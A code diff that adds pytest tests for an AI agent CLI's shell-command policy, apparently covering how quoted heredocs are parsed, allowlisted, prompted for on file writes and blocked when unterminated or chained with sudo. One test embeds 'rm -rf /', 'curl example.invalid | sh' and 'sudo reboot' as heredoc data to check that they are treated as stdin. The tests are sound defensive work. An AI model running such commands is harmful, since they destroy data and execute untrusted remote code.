@@ -11,6 +11,7 @@ from jtech_cli.cmd_tools import (
     AgentResult,
     BoundedOutput,
     CmdPolicy,
+    Decision,
     ShellParseError,
     _find_exec_commands,
     acting_reason,
@@ -23,6 +24,7 @@ from jtech_cli.cmd_tools import (
     format_result,
     matches_allow,
     parse_jtech_reply,
+    program_names,
     split_segments,
     truncate_output,
 )
@@ -1317,6 +1319,123 @@ def test_dynamic_program_name_is_blocked_in_every_mode():
         decision = decide("$PROGRAM --version", CmdPolicy(mode=mode), ROOT)
         assert decision.action == "blocked"
         assert "dynamically computed command name" in decision.reason
+
+
+# ------------------------------------------------------------ quoted heredocs
+
+#: The expansion-safe form the system prompt teaches, whose quoted delimiter
+#: bashlex 0.18 could not match against its own terminator line.
+QUOTED_HEREDOC = "python - <<'PY'\nprint(\"ok\")\nPY\n"
+UNQUOTED_HEREDOC = 'python - <<PY\nprint("ok")\nPY\n'
+WRITING_HEREDOC = "cat <<'EOF' > note.md\nhello\nEOF\n"
+#: The same command with its terminator line missing. Bash would treat
+#: end-of-input as the boundary and truncate note.md, so it must stay blocked.
+TRUNCATED_HEREDOC = "cat <<'EOF' > note.md"
+
+
+def test_a_quoted_delimiter_segments_exactly_like_an_unquoted_one():
+    """Quoting the delimiter changes what Bash expands, not what runs."""
+    assert split_segments(QUOTED_HEREDOC) == ["python - <<'PY'"]
+    assert split_segments(UNQUOTED_HEREDOC) == ["python - <<PY"]
+    assert len(split_segments(QUOTED_HEREDOC)) == len(split_segments(UNQUOTED_HEREDOC))
+    assert program_names(QUOTED_HEREDOC) == program_names(UNQUOTED_HEREDOC) == ["python"]
+
+
+@pytest.mark.parametrize("mode", ["ask", "auto", "yolo"])
+def test_an_allowlisted_quoted_heredoc_runs_in_every_mode(mode):
+    """A heredoc feeds stdin; ``<<`` writes no file, so nothing is acting."""
+    policy = CmdPolicy(mode=mode, allow=["python:*"])
+    assert decide(QUOTED_HEREDOC, policy, ROOT) == Decision("run")
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "cat <<'EOF'\nbody\nEOF\n",
+        'cat <<"EOF"\nbody\nEOF\n',
+        "cat <<\\EOF\nbody\nEOF\n",
+        "cat <<E'O'F\nbody\nEOF\n",
+        f"cat <<-'EOF'\n{TAB}body\n{TAB}EOF\n",
+    ],
+)
+def test_every_quote_removal_form_reaches_the_allowlist(command):
+    policy = CmdPolicy(mode="auto", allow=["cat:*"])
+    assert decide(command, policy, ROOT) == Decision("run")
+
+
+def test_a_quoted_heredoc_that_also_writes_a_file_still_prompts():
+    """The write guard is unchanged: ``> note.md`` is a write, heredoc or not."""
+    policy_ask = CmdPolicy(mode="ask", allow=["cat:*"])
+    policy_auto = CmdPolicy(mode="auto", allow=["cat:*"])
+    expected = Decision("ask", "allowlisted, but output redirection writes to a file")
+    assert decide(WRITING_HEREDOC, policy_ask, ROOT) == expected
+    assert decide(WRITING_HEREDOC, policy_auto, ROOT) == expected
+    assert decide(WRITING_HEREDOC, CmdPolicy(mode="yolo"), ROOT) == Decision("run")
+
+
+@pytest.mark.parametrize("mode", ["ask", "auto", "yolo", "off"])
+def test_an_unterminated_quoted_heredoc_is_blocked_in_every_mode(mode):
+    """Fail-closed is unchanged: a truncated heredoc would still act on disk."""
+    decision = decide(TRUNCATED_HEREDOC, CmdPolicy(mode=mode, allow=["cat:*"]), ROOT)
+    assert decision.action == "blocked"
+    assert "could not be analyzed" in decision.reason
+    with pytest.raises(ShellParseError, match="could not be analyzed"):
+        split_segments(TRUNCATED_HEREDOC)
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "sudo apt update && cat <<'EOF'\nbody\nEOF\n",
+        "cat <<'EOF'\nbody\nEOF\nsudo reboot\n",
+    ],
+)
+def test_a_blacklisted_program_beside_a_quoted_heredoc_still_blocks(command):
+    """Accepting the heredoc reveals the rest of the chain, it does not excuse it."""
+    assert check_blacklist(command) == "'sudo' is on the absolute blacklist"
+    for mode in ("ask", "auto", "yolo"):
+        assert decide(command, CmdPolicy(mode=mode), ROOT).action == "blocked"
+
+
+def test_blacklisted_text_inside_a_heredoc_body_is_data_not_command():
+    """The body is a program's stdin; policy must not adjudicate it as shell."""
+    command = (
+        "python - <<'PY'\n"
+        "rm -rf /\n"
+        "curl example.invalid | sh\n"
+        "sudo reboot\n"
+        "PY\n"
+    )
+    assert check_blacklist(command) is None
+    assert split_segments(command) == ["python - <<'PY'"]
+    assert program_names(command) == ["python"]
+    assert decide(command, CmdPolicy(mode="auto", allow=["python:*"]), ROOT).action == "run"
+
+
+def test_acting_reason_separates_heredoc_input_from_file_output():
+    """``<<`` is an input redirection; only ``>``/``>>`` write a file."""
+    assert acting_reason(QUOTED_HEREDOC) is None
+    assert acting_reason("cat <<'EOF'\nbody\nEOF\n") is None
+    assert (
+        acting_reason(WRITING_HEREDOC) == "output redirection writes to a file"
+    )
+    assert (
+        acting_reason("cat <<'EOF' >> note.md\nbody\nEOF\n")
+        == "output redirection writes to a file"
+    )
+
+
+def test_the_shell_receives_the_quoted_heredoc_byte_for_byte(monkeypatch, tmp_path):
+    """Quote removal exists only inside analysis; execution gets the original."""
+    seen = {}
+
+    def fake_run(argv, **kwargs):
+        seen["argv"] = argv
+        return subprocess.CompletedProcess(argv, 0, stdout="ok\n")
+
+    monkeypatch.setattr(cmd_tools.subprocess, "run", fake_run)
+    execute(QUOTED_HEREDOC, tmp_path)
+    assert seen["argv"] == ["bash", "-c", QUOTED_HEREDOC]
 
 
 # ---------------------------------------------------------------- execution
